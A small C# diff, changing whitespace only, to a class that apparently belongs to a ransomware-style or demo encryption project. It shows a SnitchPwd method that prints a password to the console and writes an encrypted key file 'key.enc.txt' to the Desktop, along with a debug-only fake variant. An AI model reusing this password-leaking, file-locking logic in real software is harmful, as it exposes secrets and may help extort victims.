@@ -6,7 +6,7 @@ namespace g0nnaL4ugh.Snitch
 {
     public class Sender
     {      
-		public static void SnitchPwd(string pwd, PathUtil pathUtil,
+        public static void SnitchPwd(string pwd, PathUtil pathUtil,
 		                             Encrypter encrypter)
         {
             Console.WriteLine("Pwd snitch: " + pwd);
@@ -16,7 +16,7 @@ namespace g0nnaL4ugh.Snitch
                                     Path.Combine(pathUtil.Desktop,
 			                                     "key.enc.txt"));
         }
-      
+
 #if DEBUG      
 		public static void FakeSnitchPwd(string pwd, PathUtil pathUtil,
 		                                 Encrypter encrypter)
